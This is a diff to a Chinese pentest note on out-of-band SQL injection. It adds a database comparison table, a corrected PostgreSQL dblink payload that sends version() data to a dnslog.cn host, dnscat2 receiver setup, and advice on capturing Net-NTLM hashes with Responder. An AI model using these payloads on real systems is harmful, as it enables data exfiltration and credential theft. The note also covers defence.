@@ -31,6 +31,21 @@ OOB（Out-of-Band）SQL 注入，是指在页面没有直接回显、报错和�
 - 目标环境允许目标协议出站
 - 需要时具备联合注入、堆叠注入或高权限函数调用条件
 
+## 四数据库 OOB 能力对比
+先总览四种数据库的通道与门槛，再按数据库看具体 payload：
+
+| 数据库 | 常用 OOB 通道 | 权限要求 | 是否需要 DBA / 高权限 | 平台与协议限制 | 常见注入形态 |
+| --- | --- | --- | --- | --- | --- |
+| MySQL | `load_file()` + UNC 路径 | 需 `FILE` 权限，且 `secure_file_priv` 为空或允许 | 不需要 DBA，普通账户授予 `FILE` 即可 | 仅 Windows 有效（UNC 依赖 SMB 名称解析）；Linux 无此行为 | 联合注入 / 堆叠注入 |
+| Oracle | `UTL_HTTP.REQUEST()`、`UTL_INADDR.GET_HOST_ADDRESS()`、`HTTPURITYPE()`、`DBMS_LDAP.INIT()` | 当前用户需对相应包有 `EXECUTE` 权限 | 不强制 DBA，但相关包权限一般由 DBA 授予 | 跨平台；依赖数据库主机可出网（HTTP / DNS / LDAP） | 联合注入 / 堆叠注入 |
+| MSSQL | `xp_dirtree`、`xp_fileexist`、`xp_subdirs` | 需 `sysadmin` 或对系统扩展过程有 `EXECUTE` | 通常需要 sysadmin 级高权限 | Windows 上效果最好（UNC 触发 DNS / SMB）；Linux 版 MSSQL 无这些 xp 过程 | 堆叠注入为主 |
+| PostgreSQL | `dblink` 扩展、`COPY ... FROM '\\server\share'` | `dblink` 需 superuser 安装扩展；`COPY` 网络路径需 superuser | 基本需要 superuser（若 dblink 已预装，普通用户可调用） | 跨平台；`COPY` 的 UNC 在 Linux 上依赖 SMB 客户端；`dblink` 走 PG 协议出网 | 堆叠注入 |
+
+选型速记：
+- 目标是 Windows：优先试 MySQL `load_file` UNC、MSSQL `xp_dirtree`
+- 目标是 Linux：优先试 Oracle 四函数、PostgreSQL `dblink`
+- 权限不明：先试门槛低的（MySQL 仅需 `FILE` 权限，低于 MSSQL 的 sysadmin 要求）
+
 ## 各数据库利用思路
 ### 1. MySQL
 #### 条件
@@ -121,8 +136,19 @@ id=1;DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text);
 #### 思路 2：开启 `dblink`
 
 ```sql
-id=1;CREATE EXTENSION dblink;SELECT * FROM dblink('host='||(SELECT version())||'.re111.dnslog.cn username=1ndex password=1ndex','SELECT 1ndex') RETURNS (result TEXT);
+-- 先安装 dblink 扩展（需 superuser），再发起带外连接
+-- 基础可用形式：先验证通道是否连通（xxx.dnslog.cn 收到查询即通）
+SELECT * FROM dblink('host=xxx.dnslog.cn user=x dbname=x', 'SELECT 1') AS (t text);
+
+-- 拼接注入数据的完整形式
+id=1;CREATE EXTENSION dblink;SELECT * FROM dblink('host='||(SELECT version())||'.re111.dnslog.cn user=1ndex password=1ndex dbname=1ndex','SELECT 1') AS (result TEXT);
 ```
+
+修正说明（原语句存在格式问题）：
+- `RETURNS (result TEXT)` 改为 `AS (result TEXT)`：表函数的列定义语法是 `AS (...)`，`RETURNS` 只用于 `CREATE FUNCTION`
+- 连接串键名改用 `user`/`password`/`dbname`：这些才是 libpq 的合法参数名，原来的 `username` 不是有效键
+- 子查询语句改为 `'SELECT 1'`：原来的 `'SELECT 1ndex'` 是非法标识符，会直接报列不存在
+- `version()` 输出含空格和括号，直接拼进 `host=` 会破坏连接串解析；实战建议先清洗特殊字符，例如 `(SELECT replace(version(),' ',''))`，或改外带较短的无空格数据
 
 ## 实战注意点
 ### 1. OOB 不等于稳定回显
@@ -139,6 +165,41 @@ id=1;CREATE EXTENSION dblink;SELECT * FROM dblink('host='||(SELECT version())||'
 - 是否有执行权限
 - 是否允许出网
 - 是否被防火墙、DNS 策略或代理拦截
+
+## 自建 DNS 接收方案
+### 1. 公共 DNSLog 平台的局限
+dnslog.cn、ceye.io、requestrepo.com 这类公共平台上手快，但有明显局限：
+- 记录公开可查：拿到或猜到子域名的任何人都能查看你的外带数据，等于把目标数据交给第三方
+- 稳定性差：公共平台经常被墙、限流或关停，长周期项目不可控
+- 域名信誉差：大量红队共用，企业安全设备可能已把这些域名加黑名单
+- 子域冲突：多任务共用平台时容易与他人撞名，记录混在一起
+- 记录保留时间短、缺少留存 API，不利于复盘取证
+
+### 2. 自建接收点
+方案一：自建权威 DNS / dnscat2
+
+```bash
+# 前提：拥有一个域名，在其 DNS 服务商处把 NS 记录指向自己的 VPS
+# NS 生效后，所有 *.yourdomain.com 的递归查询最终都会落到 VPS
+ruby dnscat2.rb yourdomain.com --dns port=53,domain=yourdomain.com
+```
+
+- 数据完全私有、域名可随时更换以规避黑名单、记录可长期留存
+
+方案二：Burp Collaborator
+- Burp Pro 自带 Collaborator，可临时替代 DNSLog 观察带外请求
+- 配合 Burp Collaborator Everywhere 插件，可对页面参数自动注入 Collaborator payload，批量发现 OOB 出网点
+- 对保密要求高的项目，Burp 支持自建 Collaborator Server（自有域名 + VPS）
+
+### 3. 内网 DNS 转发判断
+目标环境通常使用内部 DNS 服务器，外带是否可达要单独判断：
+- 原理：目标主机把 `xxx.yourdomain.com` 交给内网 DNS 递归解析，只要内网 DNS 允许转发外部域名，最终仍会查询到你的权威 NS
+- 验证：先从注入点触发固定子域名（如 `probe1.yourdomain.com`），看自建服务端是否收到
+- 收不到的常见原因：内网 DNS 配置了域名白名单或只解析内网域、DNS 出口被防火墙拦截、出站 DNS 被强制走指定转发器
+- 内网 DNS 不转发外域时 DNS 通道基本失效，可改试 HTTP / SMB 类 OOB（前提是相应协议可出网）
+
+## SMB Relay 联动
+UNC 路径类 OOB（MySQL `load_file`、MSSQL `xp_dirtree` 等）在触发目标发起 SMB 认证的同时，可在同网段配合 Responder 伪造 SMB 服务端捕获 Net-NTLM Hash，用于后续中继或离线爆破，思路见 [哈希获取笔记](../penetration/PEN-GetHash.md)。
 
 ## 防御要点
 ### 1. 根本防御仍是参数化查询
@@ -165,3 +226,4 @@ OOB 只是 SQL 注入的一种利用方式，不是单独漏洞。
 
 ## Reference
 - https://www.cnblogs.com/wjrblogs/p/14367387.html
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection（PayloadsAllTheThings SQL 注入 OOB 章节）
